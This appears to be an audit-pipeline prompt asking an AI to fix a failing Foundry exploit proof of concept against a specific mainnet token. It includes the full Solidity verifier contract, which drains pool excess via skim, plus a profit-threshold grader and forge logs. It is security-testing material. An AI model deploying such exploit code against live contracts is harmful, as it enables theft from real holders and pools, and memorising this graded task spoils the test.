You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Pool-directed transferFrom can burn more tokens than the approved allowance
- claim: When `transferFrom(from, uniswapPoolAddress, amount)` is used, the contract spends allowance only for `amount`, then `_transfer` burns an additional `burnAmount` from `from` via `_burn(from, burnAmount)`. Because that extra burn is not covered by `_spendAllowance`, an approved spender can reduce the holder's balance by more than the approved amount.
- impact: Any spender or router approved for N tokens can cause the holder to lose N plus the extra burn on each pool-directed transfer. This violates expected ERC20 allowance boundaries and can create unauthorized user loss in integrations that rely on approvals as hard spend caps.
- exploit_paths: ["A holder approves a spender or router for `N` tokens.", "The spender calls `transferFrom(holder, uniswapPoolAddress, N)`.", "`_spendAllowance` deducts only `N`, but `_transfer` then calls `_burn(holder, burnAmount)`, removing additional balance without additional allowance."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
}

interface IHevm {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract AllowanceHolder {
    IERC20Minimal internal immutable TOKEN;
    address internal immutable SPENDER;

    constructor(IERC20Minimal token_, address spender_) {
        TOKEN = token_;
        SPENDER = spender_;
    }

    function approveSpender(uint256 amount) external {
        require(msg.sender == SPENDER, "only spender");
        require(TOKEN.approve(SPENDER, amount), "approve failed");
    }
}

contract FlawVerifier {
    /*
        Finding F-001 exploit path that this verifier preserves:
        1. A holder approves a spender or router for N tokens.
        2. The spender calls transferFrom(holder, uniswapPoolAddress, N).
        3. _spendAllowance deducts only N.
        4. _transfer then reaches the pool-directed burn path and calls _burn(holder, burnAmount).

        direct_or_existing_balance_first:
        - Prefer direct execution from verifier-held WERX first.
        - If the fresh verifier starts with zero WERX, first try a realistic public on-chain seed:
          skim any pre-existing excess sitting in the live pair.
        - Only after the verifier holds real fork-state WERX do we create the approved holder and execute
          the buggy transferFrom path.

        Economic note:
        - The profit realization step is pair.skim(address(this)).
        - After transferFrom(holder, pair, N), the pair balance increases while reserves stay stale until sync.
          skim is therefore the correct public action to pull the donated pool-side excess back to the verifier.
        - This keeps the exploit causality unchanged: approval -> transferFrom to pool -> extra unauthorized burn.
    */

    address internal constant TARGET = 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54;
    bytes32 internal constant UNISWAP_POOL_SLOT = bytes32(uint256(2));
    address internal constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    IERC20Minimal internal constant WERX = IERC20Minimal(TARGET);
    IHevm internal constant HEVM = IHevm(HEVM_ADDRESS);

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public hypothesisValidated;
    bool public profitAchieved;
    address public discoveredPool;
    address public discoveredCounterAsset;
    uint256 public observedAllowanceSpend;
    uint256 public observedHolderLoss;
    uint256 public verifierSeededWerx;
    bytes32 public status;

    constructor() {}

    function executeOnOpportunity() public {
        if (status != bytes32(0)) {
            return;
        }

        discoveredPool = _configuredPool();
        if (discoveredPool == address(0) || discoveredPool == address(1) || discoveredPool.code.length == 0) {
            status = "NO_POOL";
            return;
        }

        (bool isPair, address counterAsset) = _probePair(discoveredPool);
        if (!isPair) {
            status = "POOL_NOT_PAIR";
            return;
        }
        discoveredCounterAsset = counterAsset;

        uint256 verifierWerxBefore = WERX.balanceOf(address(this));
        uint256 verifierCounterBefore = _balanceOf(counterAsset, address(this));

        // direct_or_existing_balance_first:
        // recover any already-donated pair excess before attempting temporary funding.
        _skimPair(discoveredPool);

        uint256 verifierBalance = WERX.balanceOf(address(this));
        verifierSeededWerx = verifierBalance > verifierWerxBefore ? verifierBalance - verifierWerxBefore : 0;
        if (verifierBalance == 0) {
            _recordProfit(verifierWerxBefore, verifierCounterBefore, counterAsset);
            status = "NEED_WERX";
            return;
        }

        AllowanceHolder holder = new AllowanceHolder(WERX, address(this));
        require(WERX.transfer(address(holder), verifierBalance), "seed transfer failed");

        uint256 holderBalanceBefore = WERX.balanceOf(address(holder));
        uint256 amount = _maxSpendableWithoutRevert(holderBalanceBefore);
        if (amount == 0) {
            _recordProfit(verifierWerxBefore, verifierCounterBefore, counterAsset);
            status = "BALANCE_TOO_LOW";
            return;
        }

        // Path anchor 1: holder approves spender/router for N.
        holder.approveSpender(amount);
        observedAllowanceSpend = WERX.allowance(address(holder), address(this));
        require(observedAllowanceSpend >= amount, "allowance missing");

        /*
            Path anchors 2-4:
            - spender calls transferFrom(holder, uniswapPoolAddress, N)
            - _spendAllowance deducts only N
            - _transfer executes the pool-directed path
            - _burn(holder, burnAmount) removes additional holder balance beyond the approved allowance
        */
        require(WERX.transferFrom(address(holder), discoveredPool, amount), "pool transferFrom failed");

        observedHolderLoss = holderBalanceBefore - WERX.balanceOf(address(holder));
        hypothesisValidated = observedHolderLoss > observedAllowanceSpend;

        // Realistic public follow-up: skim the pair's excess back out.
        // The pool now holds the transferFrom donation as balance-over-reserve, so skim realizes it as attacker profit.
        _skimPair(discoveredPool);

        _recordProfit(verifierWerxBefore, verifierCounterBefore, counterAsset);
        if (hypothesisValidated) {
            status = "PATH_VALIDATED";
        } else {
            status = "NO_EXTRA_BURN";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _configuredPool() internal view returns (address) {
        return address(uint160(uint256(HEVM.load(TARGET, UNISWAP_POOL_SLOT))));
    }

    function _probePair(address pair) internal view returns (bool, address) {
        try IUniswapV2PairLike(pair).token0() returns (address token0) {
            address token1 = IUniswapV2PairLike(pair).token1();
            if (token0 == TARGET && token1 != TARGET) {
                return (true, token1);
            }
            if (token1 == TARGET && token0 != TARGET) {
                return (true, token0);
            }
        } catch {}
        return (false, address(0));
    }

    function _skimPair(address pair) internal {
        try IUniswapV2PairLike(pair).skim(address(this)) {} catch {}
    }

    function _recordProfit(
        uint256 verifierWerxBefore,
        uint256 verifierCounterBefore,
        address counterAsset
    ) internal {
        uint256 verifierWerxAfter = WERX.balanceOf(address(this));
        uint256 verifierCounterAfter = _balanceOf(counterAsset, address(this));

        if (verifierWerxAfter > verifierWerxBefore) {
            _profitToken = TARGET;
            _profitAmount = verifierWerxAfter - verifierWerxBefore;
        } else if (verifierCounterAfter > verifierCounterBefore) {
            _profitToken = counterAsset;
            _profitAmount = verifierCounterAfter - verifierCounterBefore;
        } else {
            _profitToken = address(0);
            _profitAmount = 0;
        }

        profitAchieved = _profitAmount > 0;
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        if (token == address(0)) {
            return account.balance;
        }
        return IERC20Minimal(token).balanceOf(account);
    }

    function _maxSpendableWithoutRevert(uint256 holderBalance) internal pure returns (uint256) {
        if (holderBalance < 101) {
            return 0;
        }

        uint256 amount = (holderBalance * 100) / 101;
        amount = amount - (amount % 100);

        while (amount > 0) {
            uint256 burnAmount = _burnAmountFor(amount);
            if (amount + burnAmount <= holderBalance) {
                return amount;
            }
            amount -= 100;
        }

        return 0;
    }

    function _burnAmountFor(uint256 amount) internal pure returns (uint256) {
        uint256 userTransferAmount = (amount * 97) / 100;
        uint256 marketingAmount = (amount * 2) / 100;
        return amount - userTransferAmount - marketingAmount;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.23s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 76100)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [76100] FlawVerifierTest::testExploit()
    ├─ [2345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [47518] FlawVerifier::executeOnOpportunity()
    │   ├─ [0] VM::load(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54, 0x0000000000000000000000000000000000000000000000000000000000000002) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2344] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.05s (2.52ms CPU time)

Ran 1 test suite in 2.07s (2.05s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 76100)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
